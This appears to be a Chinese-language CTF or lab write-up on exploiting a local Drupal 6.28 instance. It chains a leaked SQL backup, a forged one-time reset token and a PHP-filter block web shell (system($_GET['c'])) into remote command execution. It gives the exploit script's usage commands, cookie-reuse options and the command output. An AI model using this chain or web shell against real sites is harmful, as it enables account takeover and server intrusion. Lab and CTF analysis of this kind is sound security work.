# fossasia11-drupal 项目漏洞与利用总结

- 生成日期：2026-04-27
- 目标：`fossasia11-drupal`（Drupal 6.28）
- 详细分析：`reports/漏洞分析报告.md`
- 现用利用脚本：`reports/exploit_authbypass_block_rce.py`

## 1. 结论概览

本项目未确认“直接前认证 RCE”，但确认存在一条**稳定的组合利用链**：

1. 匿名下载根目录数据库备份 `fossasia11.sql.gz`
2. 从 dump 中恢复管理员 `pass_hash` 与 `last_login`
3. 伪造 Drupal 6 一次性登录链接 `/user/reset/.../login`
4. 获取管理员会话
5. 创建带 `PHP code` 过滤器的自定义 block
6. 通过 `/?c=<cmd>` 触发命令执行

风险等级：**高危（认证绕过后 RCE）**。

---

## 2. 漏洞点与利用方式

### 2.1 备份文件泄露

**问题**：根目录存在 `fossasia11.sql.gz`，且 `.htaccess` 规则未正确覆盖这类双扩展名备份文件。  
**结果**：匿名用户可直接下载数据库转储。

**利用价值**：可提取：
- 管理员 `uid`
- `users.pass`（Drupal 6 中的一次性登录 token 计算所需）
- `users.login`（最后登录时间）

### 2.2 一次性登录链接伪造

Drupal 6 的 reset token 计算为：

```text
md5(timestamp + password_hash + last_login)
```

由于上一步已经拿到 `password_hash` 和 `last_login`，攻击者可本地构造：

```text
/user/reset/<uid>/<ts>/<token>/login
```

成功后直接获得管理员会话。

### 2.3 认证后 PHP Filter -> RCE

站点启用了 `PHP code` 输入格式，管理员可创建带 PHP 代码的 block。  
因此在拿到管理员权限后，可创建自定义 block，写入如下 runner：

```php
<?php echo "RCE_OK\n"; system(isset($_GET["c"]) ? $_GET["c"] : "id"); ?>
```

发布到可见区域后，请求：

```text
/?c=id;pwd
```

即可执行系统命令。

## 3. 脚本说明

脚本路径：

```text
reports/exploit_authbypass_block_rce.py
```

### 3.1 当前保留参数

脚本已精简为仅保留实际需要的参数：

- `--base`：目标基址
- `--cmd`：执行命令
- `--cookie-name`：复用已获取的管理员 session cookie 名称
- `--cookie-value`：复用已获取的管理员 session cookie 值
- `--existing-block-bid`：复用已存在的 RCE block
- `--show`：展示当前可用的“脏链”信息

脚本内已固定：

- dump 路径：`/fossasia11.sql.gz`
- 用户名：`admin`
- reset token 时间偏移：`5` 秒

### 3.2 状态缓存文件

脚本会读写：

```text
reports/exploit_authbypass_block_rce.state.json
```

用途：
- 缓存当前有效 cookie
- 缓存最近一次可复用的 `ctf-rce-*` block
- 配合 `--show` 展示当前可复用的脏链

## 4. 利用方式

### 4.1 干净链（从头利用）

适用于：当前实例仍处于**未消费 reset link** 的状态。

```bash
python3 reports/exploit_authbypass_block_rce.py \
  --base http://127.0.0.1:8080 \
  --cmd 'id; pwd'
```

执行流程：
- 下载 dump
- 伪造 one-time login
- 登录后台
- 创建并发布 `ctf-rce-*` block
- 命令执行

### 4.2 脏链查看（show 模式）

适用于：实例已经被使用过，reset link 已失效，但仍存在可复用 cookie / RCE block。

```bash
python3 reports/exploit_authbypass_block_rce.py \
  --base http://127.0.0.1:8080 \
  --show
```

`--show` 会输出：
- 当前可用 cookie（若 state 中存在或显式传入）
- 当前可复用 block 列表
- 可直接复制执行的“脏链”命令

### 4.3 脏链复用（cookie + 现成 block）

当 `--show` 已给出可复用 `bid` 后，可直接执行：

```bash
python3 reports/exploit_authbypass_block_rce.py \
  --base http://127.0.0.1:8080 \
  --cookie-name 'SESSxxx' \
  --cookie-value 'yyyy' \
  --existing-block-bid <bid> \
  --cmd 'id; pwd'
```

该模式会：
- 跳过 auth bypass
- 跳过新建 block
- 直接复用现有 block 执行命令

### 4.4 脏链复用（只有 cookie）

如果只有 cookie，没有现成 `bid`，也可直接复用 cookie 重建 block：

```bash
python3 reports/exploit_authbypass_block_rce.py \
  --base http://127.0.0.1:8080 \
  --cookie-name 'SESSxxx' \
  --cookie-value 'yyyy' \
  --cmd 'id; pwd'
```

## 5. 使用结果（2026-04-27 实测）

### 5.1 从头利用成功结果

实测输出片段：

```text
RCE_OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html
```

说明：
- Web 进程身份为 `www-data`
- 当前 Web 根目录为 `/var/www/html`
- 命令执行链条已成功闭环

### 5.2 脏链展示结果

`--show` 模式可正常输出：
- 可用 cookie
- 可复用 `ctf-rce-*` block
- 对应的复用命令

在本次测试时，`--show` 已成功展示一条可复用脏链（具体 `bid` 以运行时输出为准）。

### 5.3 失效场景说明

如果 reset link 已被消费，再直接跑“干净链”命令，会出现：

```text
one-time login failed; final_url=http://127.0.0.1:8080/user/password status=200
```

这是**预期行为**，原因是：
- 第一次成功使用 `/user/reset/.../login` 后
- Drupal 会更新真实数据库中的 `users.login`
- dump 文件中的 `last_login` 变成旧值
- 后续再按旧值伪造 token 就会失效

此时应改用：
- `--show` 查看脏链
- 或直接复用已有 cookie / block
